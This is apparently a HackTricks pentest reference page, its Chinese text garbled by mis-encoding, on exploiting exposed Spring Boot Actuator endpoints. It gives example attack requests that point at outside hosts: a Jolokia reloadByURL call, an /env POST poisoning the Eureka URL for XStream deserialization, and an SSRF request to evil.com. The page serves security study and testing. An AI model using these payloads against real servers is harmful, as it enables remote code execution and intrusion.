# Spring Actuators

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

**æ¥è‡ª** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Exploiting Spring Boot Actuators

**æŸ¥çœ‹åŸå§‹å¸–å­** \[**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **å…³é”®ç‚¹:**

- Spring Boot Actuatorsæ³¨å†Œè¯¸å¦‚`/health`ã€`/trace`ã€`/beans`ã€`/env`ç­‰ç«¯ç‚¹ã€‚åœ¨1åˆ°1.4ç‰ˆæœ¬ä¸­ï¼Œè¿™äº›ç«¯ç‚¹å¯ä»¥åœ¨æ— éœ€èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹è®¿é—®ã€‚ä»1.5ç‰ˆæœ¬å¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹åªæœ‰`/health`å’Œ`/info`æ˜¯éæ•æ„Ÿçš„ï¼Œä½†å¼€å‘äººå‘˜ç»å¸¸ç¦ç”¨æ­¤å®‰å…¨æ€§ã€‚
- æŸäº›Actuatorç«¯ç‚¹å¯èƒ½ä¼šæš´éœ²æ•æ„Ÿæ•°æ®æˆ–å…è®¸æœ‰å®³æ“ä½œ:
  - `/dump`ã€`/trace`ã€`/logfile`ã€`/shutdown`ã€`/mappings`ã€`/env`ã€`/actuator/env`ã€`/restart`å’Œ`/heapdump`ã€‚
- åœ¨Spring Boot 1.xä¸­ï¼Œactuatorsæ³¨å†Œåœ¨æ ¹URLä¸‹ï¼Œè€Œåœ¨2.xä¸­ï¼Œå®ƒä»¬åœ¨`/actuator/`åŸºæœ¬è·¯å¾„ä¸‹ã€‚

### **åˆ©ç”¨æŠ€æœ¯:**

1. **é€šè¿‡'/jolokia'å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ**:
- `/jolokia` actuatorç«¯ç‚¹æš´éœ²äº†Jolokiaåº“ï¼Œå…è®¸é€šè¿‡HTTPè®¿é—®MBeansã€‚
- `reloadByURL`æ“ä½œå¯è¢«åˆ©ç”¨ï¼Œä»å¤–éƒ¨URLé‡æ–°åŠ è½½æ—¥å¿—é…ç½®ï¼Œè¿™å¯èƒ½å¯¼è‡´é€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„XMLé…ç½®è¿›è¡Œç›²ç›®XXEæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
- ç¤ºä¾‹åˆ©ç”¨URL: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.
2. **é€šè¿‡'/env'ä¿®æ”¹é…ç½®**:
- å¦‚æœå­˜åœ¨Spring Cloudåº“ï¼Œåˆ™`/env`ç«¯ç‚¹å…è®¸ä¿®æ”¹ç¯å¢ƒå±æ€§ã€‚
- å¯ä»¥æ“çºµå±æ€§ä»¥åˆ©ç”¨æ¼æ´ï¼Œä¾‹å¦‚Eureka serviceURLä¸­çš„XStreamååºåˆ—åŒ–æ¼æ´ã€‚
- ç¤ºä¾‹åˆ©ç”¨POSTè¯·æ±‚:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **å…¶ä»–æœ‰ç”¨çš„è®¾ç½®**:
- å¯ä»¥æ“çºµå±æ€§å¦‚`spring.datasource.tomcat.validationQuery`ã€`spring.datasource.tomcat.url`å’Œ`spring.datasource.tomcat.max-active`ä»¥è¿›è¡Œå„ç§åˆ©ç”¨ï¼Œä¾‹å¦‚SQLæ³¨å…¥æˆ–æ›´æ”¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚

### **é™„åŠ ä¿¡æ¯:**

- å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)æ‰¾åˆ°é»˜è®¤actuatorsçš„å…¨é¢åˆ—è¡¨ã€‚
- Spring Boot 2.xä¸­çš„`/env`ç«¯ç‚¹ä½¿ç”¨JSONæ ¼å¼è¿›è¡Œå±æ€§ä¿®æ”¹ï¼Œä½†ä¸€èˆ¬æ¦‚å¿µä¿æŒä¸å˜ã€‚

### **ç›¸å…³ä¸»é¢˜:**

1. **Env + H2 RCE**:
- æœ‰å…³åˆ©ç”¨`/env`ç«¯ç‚¹å’ŒH2æ•°æ®åº“ç»„åˆçš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[æ­¤å¤„](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)ã€‚
2. **é€šè¿‡ä¸æ­£ç¡®çš„è·¯å¾„åè§£é‡Šåœ¨Spring Bootä¸Šè¿›è¡ŒSSRF**:
- Springæ¡†æ¶åœ¨HTTPè·¯å¾„åä¸­å¤„ç†çŸ©é˜µå‚æ•°(`;`)çš„æ–¹å¼å¯è¢«åˆ©ç”¨è¿›è¡ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰ã€‚
- ç¤ºä¾‹åˆ©ç”¨è¯·æ±‚:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
``` 

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
